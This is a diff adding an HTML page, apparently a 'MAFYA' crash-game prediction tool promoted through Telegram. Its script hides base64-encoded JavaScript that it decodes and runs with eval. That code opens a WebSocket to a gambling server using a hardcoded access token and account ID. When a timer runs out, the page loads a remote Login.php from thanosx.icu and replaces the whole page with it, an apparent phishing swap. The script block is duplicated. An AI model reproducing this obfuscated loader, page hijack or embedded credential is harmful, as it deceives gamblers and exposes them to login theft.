@@ -1,0 +1,245 @@
+<html lang="ar"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAFYA</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        body, html {
+            height: 100%;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            background-color: #000;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: white;
+        }
+
+        .content-container {
+            text-align: center;
+            padding: 30px 20px;
+            background-color: transparent;
+            color: white;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            box-sizing: border-box;
+            position: relative;
+            z-index: 1;
+        }
+
+        #crashValue {
+            font-size: 3em; /* ØªØµØºÙØ± Ø­Ø¬Ù Ø§ÙØ±ÙÙ */
+            margin: 15px 0;
+            padding: 15px;
+            color: #ffffff;
+            line-height: 1.2;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+            transition: transform 0.2s, opacity 0.2s;
+        }
+
+        #crashValue::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 400px; /* ØªÙØ¨ÙØ± Ø§ÙØ®ÙÙÙØ© ÙÙÙÙØ§Ù */
+            height: 400px; /* ØªÙØ¨ÙØ± Ø§ÙØ®ÙÙÙØ© ÙÙÙÙØ§Ù */
+            background-image: url('https://i.postimg.cc/52Hqwtg3/file-00000000aaac62468ce377b4925da5a6-conversation-id-68055126-7468-8004-99f8-ca77feeeca39-message-i.png');
+            background-size: cover;
+            background-position: center;
+            opacity: 0.5;
+            transform: translate(-50%, -50%);
+            z-index: -1;
+            border-radius: 50%;
+        }
+
+        .glitch {
+            position: relative;
+            display: inline-block;
+            animation: glitch-animation 1s infinite;
+        }
+
+        .glitch:before, .glitch:after {
+            content: attr(data-text);
+            position: absolute;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            opacity: 0.8;
+            color: #ff00ff;
+            z-index: -2;
+        }
+
+        .glitch:after {
+            color: #00ffff;
+            z-index: -3;
+        }
+
+        @keyframes glitch-animation {
+            0% { 
+                transform: translate(0);
+                opacity: 1;
+            }
+            20% { 
+                transform: translate(-2px, 2px);
+                opacity: 0.8;
+            }
+            40% { 
+                transform: translate(-2px, -2px);
+                opacity: 0.6;
+            }
+            60% { 
+                transform: translate(2px, 2px);
+                opacity: 0.4;
+            }
+            80% { 
+                transform: translate(2px, -2px);
+                opacity: 0.2;
+            }
+            100% { 
+                transform: translate(0);
+                opacity: 1;
+            }
+        }
+        
+        #logo {
+            width: 60px; /* ØªØµØºÙØ± Ø­Ø¬Ù Ø§ÙÙÙØºÙ */
+            height: 60px; /* ØªØµØºÙØ± Ø­Ø¬Ù Ø§ÙÙÙØºÙ */
+            position: absolute;
+            bottom: 10px; /* ÙÙÙ Ø§ÙÙÙØºÙ ÙÙØ£Ø³ÙÙ ÙÙÙÙØ§Ù */
+            cursor: pointer; /* Add pointer cursor */
+            transition: transform 0.3s; /* Add transition for scaling */
+        }
+
+        #logo:hover {
+            transform: scale(1.1); /* Scale logo on hover */
+        }
+    </style>
+
+</head>
+<body>
+    <div id="timer-container">
+
+    </div>
+    <div class="content-container">
+        <div id="crashValue" class="" data-text="0.00">0.00</div>
+    </div>
+    <img id="logo" src="https://i.postimg.cc/7Z2tNPws/file-000000002f1851f78e713dda28694bb8-conversation-id-67f080fd-0da8-800f-afe4-2471858d8781-message-i.png" alt="Logo" onclick="redirectToTelegram()">
+
+    <script>
+        window.addEventListener('resize', function(event) {
+            window.resizeTo(1024, 768);
+        });
+
+        let totalSeconds = 10 * 60;
+        const timerElement = document.getElementById('timer');
+        const crashValueElement = document.getElementById('crashValue');
+
+        function updateTimer() {
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+
+            timerElement.textContent = 
+                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
+
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                fetch('http://thanosx.icu/app/Login.php')
+                .then(response => response.text())
+                .then(html => {
+                    document.getElementsByTagName('html')[0].innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error fetching the page:', error);
+                });
+            }
+        }
+
+        function decrementTime() {
+            if (totalSeconds > 0) {
+                totalSeconds--;
+            }
+        }
+
+        const timerInterval = setInterval(() => {
+            decrementTime();
+            updateTimer();
+        }, 1000);
+
+        window.onload = () => {
+            totalSeconds = 60 * 60;
+            updateTimer();
+        };
+        
+        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vYzc0aGJlcjh3by5jb20vZ2FtZXMtZnJhbWUvc29ja2V0cy9jcmFzaD93aGVuY2U9MjImZmNvdW50cnk9NjYmcmVmPTEmZ3I9MCZhcHBHdWlkPWdhbWVzLXdlYi1tYXN0ZXImbG5nPWVuJmFjY2Vzc190b2tlbj1leUpoYkdjaU9pSkZVekkxTmlJc0ltdHBaQ0k2SWpFaUxDSjBlWEFpT2lKS1YxUWlmUS5leUp6ZFdJaU9pSTFNQzh4TVRReU9ETTFOREUxSWl3aWNHbGtJam9pTVNJc0ltcDBhU0k2SWpBdll6YzFPV1V5TVdFek9UTXdaR0UxWW1Zek1qSXdNVFpoTlRReU56QTJZalpsTW1GaFl6QTBZV1k1TkRrM01XWTJNak5oWldFMU5qZzBabVV5TlRVeFpDSXNJbUZ3Y0NJNklrNUJJaXdpYVc1dVpYSWlPaUowY25WbElpd2libUptSWpveE56UTFNREkxTkRZMExDSmxlSEFpT2pFM05EVXdNems0TmpRc0ltbGhkQ0k2TVRjME5UQXlOVFEyTkgwLkY5cjVqczlKYWR4TUFjVTVjRnZwZTJxeVJCSTQ4cmZ4M055VWI3M1o5aFlJaXIwdXBMR1IzNll2c0tVTjZjTzY0RlFkVV9DOF9BUXppZXZPT0Y4enpnJwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQljb25zb2xlLmxvZygnQ0xPU0lORyAuLi4nKTsKCQkJd3MuY2xvc2UoKTsKCQl9CgkJfQoJdmFyIG9uT3BlbiA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOwoJCXdzLnNlbmQoJ3sicHJvdG9jb2wiOiJqc29uIiwidmVyc2lvbiI6MX1ceDFlJyk7CiAgICAgICAgd3Muc2VuZCgneyJhcmd1bWVudHMiOlt7ImFjdGl2aXR5IjozMCwiYWNjb3VudCI6MTE0MjgzNTQxNX1dLCJpbnZvY2F0aW9uSWQiOiIwIiwidGFyZ2V0IjoiQWNjb3VudCIsInR5cGUiOjF9XHgxZScpOwogICAgICAKCX07Cgl2YXIgb25DbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOwoJCXdzID0gbnVsbDsKCX07CgkKCXZhciBvbk1lc3NhZ2UgPSBmdW5jdGlvbihldmVudCkgewoJCWNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEuc2xpY2UoMCwgLTEpKTsKICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7CiAgICAgICAgICAgICAgICBzZW5kKGRhdGEuYXJndW1lbnRzWzBdLmYpOwogICAgICAgICAgICB9Cgl9OwoJCgl2YXIgb25FcnJvciA9IGZ1bmN0aW9uKGV2ZW50KSB7CgkJYWxlcnQoZXZlbnQuZGF0YSk7Cgl9CglvcGVuKCkKCX0KCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQ==";
+        var decodedJsCode = atob(encryptedJsCode);
+
+        eval(decodedJsCode);
+
+        function redirectToTelegram() {
+            window.location.href = 'https://t.me/MAFYA_9';
+        }
+    </script>
+
+<script>
+        window.addEventListener('resize', function(event) {
+            window.resizeTo(1024, 768);
+        });
+
+        let totalSeconds = 10 * 60;
+        const timerElement = document.getElementById('timer');
+        const crashValueElement = document.getElementById('crashValue');
+
+        function updateTimer() {
+            const hours = Math.floor(totalSeconds / 3600);
+            const minutes = Math.floor((totalSeconds % 3600) / 60);
+            const seconds = totalSeconds % 60;
+
+            timerElement.textContent = 
+                `${hours.toString().padStart(2, '0')} : ${minutes.toString().padStart(2, '0')} : ${seconds.toString().padStart(2, '0')}`;
+
+            if (totalSeconds <= 0) {
+                clearInterval(timerInterval);
+                fetch('http://thanosx.icu/app/Login.php')
+                .then(response => response.text())
+                .then(html => {
+                    document.getElementsByTagName('html')[0].innerHTML = html;
+                })
+                .catch(error => {
+                    console.error('Error fetching the page:', error);
+                });
+            }
+        }
+
+        function decrementTime() {
+            if (totalSeconds > 0) {
+                totalSeconds--;
+            }
+        }
+
+        const timerInterval = setInterval(() => {
+            decrementTime();
+            updateTimer();
+        }, 1000);
+
+        window.onload = () => {
+            totalSeconds = 60 * 60;
+            updateTimer();
+        };
+        
+        var encryptedJsCode = "bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vYzc0aGJlcjh3by5jb20vZ2FtZXMtZnJhbWUvc29ja2V0cy9jcmFzaD93aGVuY2U9MjImZmNvdW50cnk9NjYmcmVmPTEmZ3I9MCZhcHBHdWlkPWdhbWVzLXdlYi1tYXN0ZXImbG5nPWVuJmFjY2Vzc190b2tlbj1leUpoYkdjaU9pSkZVekkxTmlJc0ltdHBaQ0k2SWpFaUxDSjBlWEFpT2lKS1YxUWlmUS5leUp6ZFdJaU9pSTFNQzh4TVRReU9ETTFOREUxSWl3aWNHbGtJam9pTVNJc0ltcDBhU0k2SWpBdll6YzFPV1V5TVdFek9UTXdaR0UxWW1Zek1qSXdNVFpoTlRReU56QTJZalpsTW1GaFl6QTBZV1k1TkRrM01XWTJNak5oWldFMU5qZzBabVV5TlRVeFpDSXNJbUZ3Y0NJNklrNUJJaXdpYVc1dVpYSWlPaUowY25WbElpd2libUptSWpveE56UTFNREkxTkRZMExDSmxlSEFpT2pFM05EVXdNems0TmpRc0ltbGhkQ0k2TVRjME5UQXlOVFEyTkgwLkY5cjVqczlKYWR4TUFjVTVjRnZwZTJxeVJCSTQ4cmZ4M055VWI3M1o5aFlJaXIwdXBMR1IzNll2c0tVTjZjTzY0RlFkVV9DOF9BUXppZXZPT0Y4enpnJwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQljb25zb2xlLmxvZygnQ0xPU0lORyAuLi4nKTsKCQkJd3MuY2xvc2UoKTsKCQl9CgkJfQoJdmFyIG9uT3BlbiA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdPUEVORUQ6ICcpOwoJCXdzLnNlbmQoJ3sicHJvdG9jb2wiOiJqc29uIiwidmVyc2lvbiI6MX1ceDFlJyk7CiAgICAgICAgd3Muc2VuZCgneyJhcmd1bWVudHMiOlt7ImFjdGl2aXR5IjozMCwiYWNjb3VudCI6MTE0MjgzNTQxNX1dLCJpbnZvY2F0aW9uSWQiOiIwIiwidGFyZ2V0IjoiQWNjb3VudCIsInR5cGUiOjF9XHgxZScpOwogICAgICAKCX07Cgl2YXIgb25DbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWNvbnNvbGUubG9nKCdDTE9TRUQ6ICcpOwoJCXdzID0gbnVsbDsKCX07CgkKCXZhciBvbk1lc3NhZ2UgPSBmdW5jdGlvbihldmVudCkgewoJCWNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKGV2ZW50LmRhdGEuc2xpY2UoMCwgLTEpKTsKICAgICAgICAgICAgaWYgKGRhdGEudGFyZ2V0ID09PSAnT25DcmFzaCcgKSB7CiAgICAgICAgICAgICAgICBzZW5kKGRhdGEuYXJndW1lbnRzWzBdLmYpOwogICAgICAgICAgICB9Cgl9OwoJCgl2YXIgb25FcnJvciA9IGZ1bmN0aW9uKGV2ZW50KSB7CgkJYWxlcnQoZXZlbnQuZGF0YSk7Cgl9CglvcGVuKCkKCX0KCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQ==";
+        var decodedJsCode = atob(encryptedJsCode);
+
+        eval(decodedJsCode);
+
+        function redirectToTelegram() {
+            window.location.href = 'https://t.me/MAFYA_9';
+        }
+    </script></body></html>
